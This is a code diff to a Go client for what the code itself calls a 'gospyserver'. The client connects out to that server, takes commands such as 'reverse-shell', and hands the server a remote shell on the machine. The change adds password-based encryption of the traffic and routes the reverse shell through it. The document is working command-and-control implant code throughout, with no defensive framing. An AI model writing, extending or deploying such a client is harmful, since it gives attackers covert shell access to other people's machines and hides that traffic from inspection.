@@ -12,20 +12,32 @@ import (
 // ToDo: What happens if server drops?
 
 func main() {
-	address := *flag.String("a", "127.0.0.1:12345", "the address (ip:port) of the gospyserver to connect to")
-	log.Printf("Using address %s\n", address)
+	address := flag.String("a", "127.0.0.1:12345", "the address (ip:port) of the gospyserver to connect to")
+	password := flag.String("p", "", "the password to encrypt network data with")
+	flag.Parse()
 
-	conn, err := net.Dial("tcp", address)
+	log.Printf("Using address %s\n", *address)
+
+	conn, err := net.Dial("tcp", *address)
 	if err != nil {
 		log.Fatal(err)
 	}
 
+	var cm comms.PacketManager
+
+	if *password != "" {
+		cm = comms.NewEncryptedConn(conn, *password)
+	} else {
+		cm = comms.NewPlainConn(conn)
+	}
+
 	for {
-		message, err := comms.RecvStringFrom(conn)
+		messageBytes, err := cm.RecvBytes()
 		if err != nil {
 			log.Fatal(err)
 		}
 
+		message := string(messageBytes)
 		log.Printf("Recv: %s", string(message))
 
 		switch message {
@@ -35,13 +47,13 @@ func main() {
 			os.Exit(0)
 
 		case "ping":
-			err = comms.SendStringTo(conn, "pong")
+			err = cm.SendBytes([]byte("pong"))
 			if err != nil {
 				log.Printf("pong failed: %s\n", err.Error())
 			}
 
 		case "reverse-shell":
-			err = shell.StartReverseShell(conn)
+			err = shell.StartReverseShell(cm)
 			if err != nil {
 				log.Printf("reverse-shell failed: %s\n", err.Error())
 			}
